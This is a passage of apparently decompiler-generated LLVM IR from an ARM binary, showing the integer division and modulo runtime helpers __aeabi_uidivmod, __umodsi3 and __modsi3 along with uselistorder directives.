  uselistorder i32 %v1_f348, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f33c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_f33c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_f32c, { 1, 0 }
  uselistorder i32 %v0_f304, { 1, 0 }
  uselistorder i32 %v4_f2f8, { 1, 0 }
  uselistorder i32 %v1_f300, { 1, 2, 0 }
  uselistorder i32 %v4_f2ec, { 1, 0 }
  uselistorder i32 %v1_f2f4, { 1, 2, 0 }
  uselistorder i32 %v4_f2e0, { 1, 0 }
  uselistorder i32 %v1_f2e8, { 1, 2, 0 }
  uselistorder i32 %v1_f30c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_f2dc, { 1, 0 }
  uselistorder i32 %v1_f308, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_f2c8, { 1, 0 }
  uselistorder i32 %v3_f2c4, { 1, 0 }
  uselistorder i32 %v1_f2c4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_f2c8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f2b4, { 1, 0 }
  uselistorder i32 %v4_f2b0, { 2, 1, 0 }
  uselistorder i32 %v1_f2b4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_f2bc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_f288, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_f314, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_f2d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f2bcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_f378 = udiv i32 %arg1, %arg2
  ret i32 %v2_f378
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f38c = add i32 %arg2, -1
  %v2_f38c = icmp eq i32 %arg2, 0
  br i1 %v2_f38c, label %dec_label_pc_f448, label %dec_label_pc_f394

dec_label_pc_f394:                                ; preds = %entry
  %v7_f38c = icmp eq i32 %arg2, 1
  br i1 %v7_f38c, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_f394
  %v1_f394 = load i32, i32* @r0, align 4
  %v10_f394 = icmp eq i32 %v1_f394, %arg2
  br i1 %v10_f394, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_f394, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_f394 = icmp ult i32 %v1_f394, %arg2
  br i1 %v4_f394, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_f39c = and i32 %v1_f38c, %arg2
  %v8_f39c = icmp eq i32 %v6_f39c, 0
  br i1 %v8_f39c, label %.thread67, label %dec_label_pc_f3ac.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_f3a0 = phi i32 [ %v1_f394, %bb75 ], [ 0, %.thread65 ]
  %v3_f3a0 = and i32 %v1_f3a0, %v1_f38c
  br label %bb76

dec_label_pc_f3ac.preheader:                      ; preds = %bb75
  %v2_f3ac99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_f3ac99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_f43c, %bb74, %bb89, %bb84, %dec_label_pc_f40c, %.thread67
  %v5_f3a4 = phi i32 [ %v1_f394, %bb74 ], [ %v3_f3a0, %.thread67 ], [ %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, %dec_label_pc_f40c ], [ 0, %bb84 ], [ %v1_f440, %dec_label_pc_f43c ], [ %v2_f43c, %bb89 ]
  ret i32 %v5_f3a4

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_f3ac.preheader
  %v0_f3c0.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_f3ac.preheader ], [ %v4_f3b4, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f3ac.preheader ], [ %v2_f3b811, %.thread1.thread9 ]
  br label %dec_label_pc_f3c0thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_f3ac.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_f3b811, %.thread1.thread9 ], [ 0, %dec_label_pc_f3ac.preheader ]
  %v0_f3c0.pr33100 = phi i32 [ %v4_f3b4, %.thread1.thread9 ], [ %arg2, %dec_label_pc_f3ac.preheader ]
  %v4_f3b0 = icmp ult i32 %v0_f3c0.pr33100, %v1_f394
  br i1 %v4_f3b0, label %bb78, label %dec_label_pc_f3c0thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_f3b4 = and i32 %v0_f3c0.pr33100, 268435456
  %v3_f3b4 = icmp eq i32 %v2_f3b4, 0
  %v4_f3b4 = mul i32 %v0_f3c0.pr33100, 16
  br i1 %v3_f3b4, label %.thread1.thread9, label %dec_label_pc_f3c0.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_f3b811 = add i32 %storemerge101, 4
  %v2_f3ac = icmp ugt i32 %v4_f3b4, 268435455
  br i1 %v2_f3ac, label %.thread, label %bb77

dec_label_pc_f3c0thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_f3c0thread-pre-split.loopexit

dec_label_pc_f3c0thread-pre-split.loopexit:       ; preds = %dec_label_pc_f3c0thread-pre-split.loopexit.loopexit, %.thread
  %v0_f3c0.pr3398 = phi i32 [ %v0_f3c0.pr33.lcssa, %.thread ], [ %v0_f3c0.pr33100, %dec_label_pc_f3c0thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_f3c0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f3c0thread-pre-split

dec_label_pc_f3c0thread-pre-split:                ; preds = %.thread4, %dec_label_pc_f3c0thread-pre-split.loopexit
  %v1_f3cc39 = phi i32 [ %storemerge95, %dec_label_pc_f3c0thread-pre-split.loopexit ], [ %v2_f3cc, %.thread4 ]
  %v0_f3c0.pr = phi i32 [ %v0_f3c0.pr3398, %dec_label_pc_f3c0thread-pre-split.loopexit ], [ %v3_f3c8, %.thread4 ]
  br label %dec_label_pc_f3c0

dec_label_pc_f3c0.loopexit:                       ; preds = %bb78
  br label %dec_label_pc_f3c0

dec_label_pc_f3c0:                                ; preds = %dec_label_pc_f3c0.loopexit, %dec_label_pc_f3c0thread-pre-split
  %v0_f3d4.pr = phi i32 [ %v1_f3cc39, %dec_label_pc_f3c0thread-pre-split ], [ %storemerge101, %dec_label_pc_f3c0.loopexit ]
  %v1_f3c8 = phi i32 [ %v0_f3c0.pr, %dec_label_pc_f3c0thread-pre-split ], [ %v4_f3b4, %dec_label_pc_f3c0.loopexit ]
  %v2_f3c0 = icmp slt i32 %v1_f3c8, 0
  br i1 %v2_f3c0, label %dec_label_pc_f3d4, label %bb79

bb79:                                             ; preds = %dec_label_pc_f3c0
  %v4_f3c4 = icmp ult i32 %v1_f3c8, %v1_f394
  br i1 %v4_f3c4, label %.thread4, label %dec_label_pc_f3d4

.thread4:                                         ; preds = %bb79
  %v3_f3c8 = mul i32 %v1_f3c8, 2
  %v2_f3cc = add i32 %v0_f3d4.pr, 1
  br label %dec_label_pc_f3c0thread-pre-split

dec_label_pc_f3d4:                                ; preds = %bb79, %dec_label_pc_f3c0
  %v2_f3d4 = add i32 %v0_f3d4.pr, -3
  %v5_f3d8 = icmp slt i32 %v0_f3d4.pr, 3
  br i1 %v5_f3d8, label %dec_label_pc_f418, label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f3d4, %bb83
  %v6_f404 = phi i32 [ %v0_f40c, %bb83 ], [ %v2_f3d4, %dec_label_pc_f3d4 ]
  %v1_f3e0 = phi i32 [ %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, %bb83 ], [ %v1_f394, %dec_label_pc_f3d4 ]
  %v3_f40012 = phi i32 [ %v3_f400, %bb83 ], [ %v1_f3c8, %dec_label_pc_f3d4 ]
  %v3_f3dc = icmp ult i32 %v1_f3e0, %v3_f40012
  %v3_f3e0 = select i1 %v3_f3dc, i32 0, i32 %v3_f40012
  %v1_f3e8 = sub i32 %v1_f3e0, %v3_f3e0
  %v4_f3e4 = udiv i32 %v3_f40012, 2
  %v6_f3e4 = icmp ult i32 %v1_f3e8, %v4_f3e4
  %v6_f3e8 = select i1 %v6_f3e4, i32 0, i32 %v4_f3e4
  %v1_f3e8.v6_f3e8 = sub i32 %v1_f3e8, %v6_f3e8
  %.demorgan = and i1 %v3_f3dc, %v6_f3e4
  %v4_f3ec = udiv i32 %v3_f40012, 4
  %v6_f3ec = icmp ult i32 %v1_f3e8.v6_f3e8, %v4_f3ec
  %v6_f3f0 = select i1 %v6_f3ec, i32 0, i32 %v4_f3ec
  %v1_f3e8.v6_f3e8.v6_f3f0 = sub i32 %v1_f3e8.v6_f3e8, %v6_f3f0
  %.demorgan71 = and i1 %.demorgan, %v6_f3ec
  %v4_f3f4 = udiv i32 %v3_f40012, 8
  %v6_f3f4 = icmp ult i32 %v1_f3e8.v6_f3e8.v6_f3f0, %v4_f3f4
  %v6_f3f8 = select i1 %v6_f3f4, i32 0, i32 %v4_f3f4
  %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8 = sub i32 %v1_f3e8.v6_f3e8.v6_f3f0, %v6_f3f8
  %.demorgan72 = and i1 %.demorgan71, %v6_f3f4
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_f3dc
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_f3dc, %bb80
  %v2_f3fc = add i32 %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, -1
  %v4_f3fc = sub i32 0, %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8
  %v5_f3fc = and i32 %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, %v4_f3fc
  %v3_f400 = udiv i32 %v3_f40012, 16
  %v5_f404 = icmp slt i32 %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, 1
  br i1 %v5_f404, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_f404 = add i32 %v6_f404, -4
  %v9_f404 = sub i32 3, %v6_f404
  %v10_f404 = and i32 %v9_f404, %v6_f404
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_f40c = phi i32 [ %v6_f404, %bb81 ], [ %v7_f404, %bb82 ]
  %v0_f40815.in = phi i32 [ %v2_f3fc, %bb81 ], [ %v7_f404, %bb82 ]
  %v1_f40814.in = phi i32 [ %v5_f3fc, %bb81 ], [ %v10_f404, %bb82 ]
  %v1_f40814 = icmp slt i32 %v1_f40814.in, 0
  %v0_f40815 = icmp slt i32 %v0_f40815.in, 0
  %v2_f408 = xor i1 %v0_f40815, %v1_f40814
  br i1 %v2_f408, label %dec_label_pc_f40c, label %dec_label_pc_f3dc

dec_label_pc_f40c:                                ; preds = %bb83
  %v1_f40c = urem i32 %v0_f40c, 4
  %v2_f40c = icmp eq i32 %v1_f40c, 0
  br i1 %v2_f40c, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_f40c
  %v3_f410 = icmp eq i32 %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, 0
  br i1 %v3_f410, label %bb76, label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %bb84, %dec_label_pc_f3d4
  %v0_f42c = phi i32 [ %v3_f400, %bb84 ], [ %v1_f3c8, %dec_label_pc_f3d4 ]
  %v1_f428 = phi i32 [ %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, %bb84 ], [ %v1_f394, %dec_label_pc_f3d4 ]
  %v0_f418 = phi i32 [ %v0_f40c, %bb84 ], [ %v2_f3d4, %dec_label_pc_f3d4 ]
  %v5_f41c = icmp slt i32 %v0_f418, -2
  br i1 %v5_f41c, label %dec_label_pc_f43c, label %dec_label_pc_f420

dec_label_pc_f420:                                ; preds = %dec_label_pc_f418
  %v8_f418 = icmp eq i32 %v0_f418, -2
  br i1 %v8_f418, label %dec_label_pc_f430, label %dec_label_pc_f424

dec_label_pc_f424:                                ; preds = %dec_label_pc_f420
  %v3_f424 = icmp ult i32 %v1_f428, %v0_f42c
  br i1 %v3_f424, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_f424
  %v2_f424 = sub i32 %v1_f428, %v0_f42c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_f424, %bb85
  %v0_f43052 = phi i32 [ %v1_f428, %dec_label_pc_f424 ], [ %v2_f424, %bb85 ]
  %v3_f42c = udiv i32 %v0_f42c, 2
  br label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %dec_label_pc_f420, %bb86
  %v0_f438 = phi i32 [ %v0_f42c, %dec_label_pc_f420 ], [ %v3_f42c, %bb86 ]
  %v1_f434 = phi i32 [ %v1_f428, %dec_label_pc_f420 ], [ %v0_f43052, %bb86 ]
  %v3_f430 = icmp ult i32 %v1_f434, %v0_f438
  br i1 %v3_f430, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_f430
  %v2_f430 = sub i32 %v1_f434, %v0_f438
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_f430, %bb87
  %v0_f43c55 = phi i32 [ %v1_f434, %dec_label_pc_f430 ], [ %v2_f430, %bb87 ]
  %v3_f438 = udiv i32 %v0_f438, 2
  br label %dec_label_pc_f43c

dec_label_pc_f43c:                                ; preds = %dec_label_pc_f418, %bb88
  %v2_f440 = phi i32 [ %v0_f42c, %dec_label_pc_f418 ], [ %v3_f438, %bb88 ]
  %v1_f440 = phi i32 [ %v1_f428, %dec_label_pc_f418 ], [ %v0_f43c55, %bb88 ]
  %v3_f43c = icmp ult i32 %v1_f440, %v2_f440
  br i1 %v3_f43c, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_f43c
  %v2_f43c = sub i32 %v1_f440, %v2_f440
  br label %bb76

dec_label_pc_f448:                                ; preds = %entry
  %v0_f448 = load i32, i32* @lr, align 4
  %v0_f44c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_f448)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_f440, { 1, 2, 0 }
  uselistorder i32 %v0_f42c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_f40c, { 1, 0, 2 }
  uselistorder i32 %v7_f404, { 1, 0 }
  uselistorder i32 %v3_f400, { 1, 0 }
  uselistorder i32 %v1_f3e8.v6_f3e8.v6_f3f0.v6_f3f8, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_f3f4, { 1, 0 }
  uselistorder i32 %v4_f3ec, { 1, 0 }
  uselistorder i32 %v4_f3e4, { 1, 0 }
  uselistorder i32 %v6_f404, { 3, 0, 2, 1 }
  uselistorder i32 %v2_f3d4, { 1, 0 }
  uselistorder i32 %v1_f3c8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_f3b4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f3c0.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f394, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_f43c, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_f430, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_f3dc, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_f458 = icmp eq i32 %arg2, 0
  br i1 %v2_f458, label %dec_label_pc_f52c, label %dec_label_pc_f460

dec_label_pc_f460:                                ; preds = %entry
  %v1_f458 = icmp slt i32 %arg2, 0
  br i1 %v1_f458, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_f460
  %v2_f460 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_f460, %bb
  %v4_f478 = phi i32 [ %arg2, %dec_label_pc_f460 ], [ %v2_f460, %bb ]
  %v0_f464 = load i32, i32* @r0, align 4
  %v1_f464 = icmp slt i32 %v0_f464, 0
  br i1 %v1_f464, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_f468 = sub i32 0, %v0_f464
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_f470 = phi i32 [ %v0_f464, %bb79 ], [ %v2_f468, %bb80 ]
  %v1_f46c = add i32 %v4_f478, -1
  %v7_f46c = icmp eq i32 %v4_f478, 1
  br i1 %v7_f46c, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_f470 = icmp eq i32 %v1_f470, %v4_f478
  br i1 %v10_f470, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_f470 = icmp ult i32 %v1_f470, %v4_f478
  br i1 %v4_f470, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_f478 = and i32 %v1_f46c, %v4_f478
  %v8_f478 = icmp eq i32 %v6_f478, 0
  br i1 %v8_f478, label %.thread72, label %dec_label_pc_f488.preheader

dec_label_pc_f488.preheader:                      ; preds = %bb84
  %v2_f488109 = icmp ugt i32 %v4_f478, 268435455
  br i1 %v2_f488109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_f47c64 = phi i32 [ %v1_f470, %bb84 ], [ 0, %.thread70 ]
  %v3_f47c = and i32 %v1_f47c64, %v1_f46c
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_f488.preheader
  %v0_f49c.pr35.lcssa = phi i32 [ %v4_f478, %dec_label_pc_f488.preheader ], [ %v4_f490, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_f488.preheader ], [ %v2_f4949, %.thread2.thread7 ]
  br label %dec_label_pc_f49cthread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_f488.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_f4949, %.thread2.thread7 ], [ 0, %dec_label_pc_f488.preheader ]
  %v0_f49c.pr35110 = phi i32 [ %v4_f490, %.thread2.thread7 ], [ %v4_f478, %dec_label_pc_f488.preheader ]
  %v4_f48c = icmp ult i32 %v0_f49c.pr35110, %v1_f470
  br i1 %v4_f48c, label %bb86, label %dec_label_pc_f49cthread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_f490 = and i32 %v0_f49c.pr35110, 268435456
  %v3_f490 = icmp eq i32 %v2_f490, 0
  %v4_f490 = mul i32 %v0_f49c.pr35110, 16
  br i1 %v3_f490, label %.thread2.thread7, label %dec_label_pc_f49c.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_f4949 = add i32 %storemerge111, 4
  %v2_f488 = icmp ugt i32 %v4_f490, 268435455
  br i1 %v2_f488, label %.thread1, label %bb85

dec_label_pc_f49cthread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_f49cthread-pre-split.loopexit

dec_label_pc_f49cthread-pre-split.loopexit:       ; preds = %dec_label_pc_f49cthread-pre-split.loopexit.loopexit, %.thread1
  %v0_f49c.pr35108 = phi i32 [ %v0_f49c.pr35.lcssa, %.thread1 ], [ %v0_f49c.pr35110, %dec_label_pc_f49cthread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_f49cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_f49cthread-pre-split

dec_label_pc_f49cthread-pre-split:                ; preds = %.thread4, %dec_label_pc_f49cthread-pre-split.loopexit
  %v1_f4a841 = phi i32 [ %storemerge105, %dec_label_pc_f49cthread-pre-split.loopexit ], [ %v2_f4a8, %.thread4 ]
  %v2_f4a036 = phi i32 [ %v1_f470, %dec_label_pc_f49cthread-pre-split.loopexit ], [ %v2_f4a0, %.thread4 ]
  %v0_f49c.pr = phi i32 [ %v0_f49c.pr35108, %dec_label_pc_f49cthread-pre-split.loopexit ], [ %v3_f4a4, %.thread4 ]
  br label %dec_label_pc_f49c

dec_label_pc_f49c.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_f49c

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f49c.loopexit, %dec_label_pc_f49cthread-pre-split
  %v0_f4b0.pr = phi i32 [ %v1_f4a841, %dec_label_pc_f49cthread-pre-split ], [ %storemerge111, %dec_label_pc_f49c.loopexit ]
  %v2_f4a0 = phi i32 [ %v2_f4a036, %dec_label_pc_f49cthread-pre-split ], [ %v1_f470, %dec_label_pc_f49c.loopexit ]
  %v1_f4a4 = phi i32 [ %v0_f49c.pr, %dec_label_pc_f49cthread-pre-split ], [ %v4_f490, %dec_label_pc_f49c.loopexit ]
  %v2_f49c = icmp slt i32 %v1_f4a4, 0
  br i1 %v2_f49c, label %dec_label_pc_f4b0, label %bb87

bb87:                                             ; preds = %dec_label_pc_f49c
  %v4_f4a0 = icmp ult i32 %v1_f4a4, %v2_f4a0
  br i1 %v4_f4a0, label %.thread4, label %dec_label_pc_f4b0

.thread4:                                         ; preds = %bb87
  %v3_f4a4 = mul i32 %v1_f4a4, 2
  %v2_f4a8 = add i32 %v0_f4b0.pr, 1
  br label %dec_label_pc_f49cthread-pre-split

dec_label_pc_f4b0:                                ; preds = %bb87, %dec_label_pc_f49c
  %v2_f4b0 = add i32 %v0_f4b0.pr, -3
  %v5_f4b4 = icmp slt i32 %v0_f4b0.pr, 3
  br i1 %v5_f4b4, label %dec_label_pc_f4f4, label %dec_label_pc_f4b8

dec_label_pc_f4b8:                                ; preds = %dec_label_pc_f4b0, %bb91
  %v6_f4e0 = phi i32 [ %v0_f4e8, %bb91 ], [ %v2_f4b0, %dec_label_pc_f4b0 ]
  %v1_f4bc = phi i32 [ %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, %bb91 ], [ %v2_f4a0, %dec_label_pc_f4b0 ]
  %v3_f4dc10 = phi i32 [ %v3_f4dc, %bb91 ], [ %v1_f4a4, %dec_label_pc_f4b0 ]
  %v3_f4b8 = icmp ult i32 %v1_f4bc, %v3_f4dc10
  %v3_f4bc = select i1 %v3_f4b8, i32 0, i32 %v3_f4dc10
  %v1_f4c4 = sub i32 %v1_f4bc, %v3_f4bc
  %v4_f4c0 = udiv i32 %v3_f4dc10, 2
  %v6_f4c0 = icmp ult i32 %v1_f4c4, %v4_f4c0
  %v6_f4c4 = select i1 %v6_f4c0, i32 0, i32 %v4_f4c0
  %v1_f4c4.v6_f4c4 = sub i32 %v1_f4c4, %v6_f4c4
  %.demorgan = and i1 %v3_f4b8, %v6_f4c0
  %v4_f4c8 = udiv i32 %v3_f4dc10, 4
  %v6_f4c8 = icmp ult i32 %v1_f4c4.v6_f4c4, %v4_f4c8
  %v6_f4cc = select i1 %v6_f4c8, i32 0, i32 %v4_f4c8
  %v1_f4c4.v6_f4c4.v6_f4cc = sub i32 %v1_f4c4.v6_f4c4, %v6_f4cc
  %.demorgan76 = and i1 %.demorgan, %v6_f4c8
  %v4_f4d0 = udiv i32 %v3_f4dc10, 8
  %v6_f4d0 = icmp ult i32 %v1_f4c4.v6_f4c4.v6_f4cc, %v4_f4d0
  %v6_f4d4 = select i1 %v6_f4d0, i32 0, i32 %v4_f4d0
  %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4 = sub i32 %v1_f4c4.v6_f4c4.v6_f4cc, %v6_f4d4
  %.demorgan77 = and i1 %.demorgan76, %v6_f4d0
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_f4b8
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_f4b8, %bb88
  %v2_f4d8 = add i32 %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, -1
  %v4_f4d8 = sub i32 0, %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4
  %v5_f4d8 = and i32 %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, %v4_f4d8
  %v3_f4dc = udiv i32 %v3_f4dc10, 16
  %v5_f4e0 = icmp slt i32 %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, 1
  br i1 %v5_f4e0, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_f4e0 = add i32 %v6_f4e0, -4
  %v9_f4e0 = sub i32 3, %v6_f4e0
  %v10_f4e0 = and i32 %v9_f4e0, %v6_f4e0
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_f4e8 = phi i32 [ %v6_f4e0, %bb89 ], [ %v7_f4e0, %bb90 ]
  %v0_f4e413.in = phi i32 [ %v2_f4d8, %bb89 ], [ %v7_f4e0, %bb90 ]
  %v1_f4e412.in = phi i32 [ %v5_f4d8, %bb89 ], [ %v10_f4e0, %bb90 ]
  %v1_f4e412 = icmp slt i32 %v1_f4e412.in, 0
  %v0_f4e413 = icmp slt i32 %v0_f4e413.in, 0
  %v2_f4e4 = xor i1 %v0_f4e413, %v1_f4e412
  br i1 %v2_f4e4, label %dec_label_pc_f4e8, label %dec_label_pc_f4b8

dec_label_pc_f4e8:                                ; preds = %bb91
  %v1_f4e8 = urem i32 %v0_f4e8, 4
  %v2_f4e8 = icmp eq i32 %v1_f4e8, 0
  br i1 %v2_f4e8, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_f4e8
  %v3_f4ec = icmp eq i32 %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, 0
  br i1 %v3_f4ec, label %.thread6, label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %bb92, %dec_label_pc_f4b0
  %v0_f508 = phi i32 [ %v3_f4dc, %bb92 ], [ %v1_f4a4, %dec_label_pc_f4b0 ]
  %v1_f504 = phi i32 [ %v1_f4c4.v6_f4c4.v6_f4cc.v6_f4d4, %bb92 ], [ %v2_f4a0, %dec_label_pc_f4b0 ]
  %v0_f4f4 = phi i32 [ %v0_f4e8, %bb92 ], [ %v2_f4b0, %dec_label_pc_f4b0 ]
  %v5_f4f8 = icmp slt i32 %v0_f4f4, -2
  br i1 %v5_f4f8, label %dec_label_pc_f518, label %dec_label_pc_f4fc

dec_label_pc_f4fc:                                ; preds = %dec_label_pc_f4f4
  %v8_f4f4 = icmp eq i32 %v0_f4f4, -2
  br i1 %v8_f4f4, label %dec_label_pc_f50c, label %dec_label_pc_f500

dec_label_pc_f500:                                ; preds = %dec_label_pc_f4fc
  %v3_f500 = icmp ult i32 %v1_f504, %v0_f508
  br i1 %v3_f500, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_f500
  %v2_f500 = sub i32 %v1_f504, %v0_f508
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_f500, %bb93
  %v0_f50c54 = phi i32 [ %v1_f504, %dec_label_pc_f500 ], [ %v2_f500, %bb93 ]
  %v3_f508 = udiv i32 %v0_f508, 2
  br label %dec_label_pc_f50c

dec_label_pc_f50c:                                ; preds = %dec_label_pc_f4fc, %bb94
  %v0_f514 = phi i32 [ %v0_f508, %dec_label_pc_f4fc ], [ %v3_f508, %bb94 ]
  %v1_f510 = phi i32 [ %v1_f504, %dec_label_pc_f4fc ], [ %v0_f50c54, %bb94 ]
  %v3_f50c = icmp ult i32 %v1_f510, %v0_f514
  br i1 %v3_f50c, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_f50c
  %v2_f50c = sub i32 %v1_f510, %v0_f514
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_f50c, %bb95
  %v0_f51857 = phi i32 [ %v1_f510, %dec_label_pc_f50c ], [ %v2_f50c, %bb95 ]
  %v3_f514 = udiv i32 %v0_f514, 2
  br label %dec_label_pc_f518

dec_label_pc_f518:                                ; preds = %dec_label_pc_f4f4, %bb96
  %v2_f51c = phi i32 [ %v0_f508, %dec_label_pc_f4f4 ], [ %v3_f514, %bb96 ]
  %v1_f51c = phi i32 [ %v1_f504, %dec_label_pc_f4f4 ], [ %v0_f51857, %bb96 ]
  %v3_f518 = icmp ult i32 %v1_f51c, %v2_f51c
  br i1 %v3_f518, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_f518
  %v2_f518 = sub i32 %v1_f51c, %v2_f51c
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_f518, %bb83, %.thread72, %dec_label_pc_f4e8, %bb92, %bb97
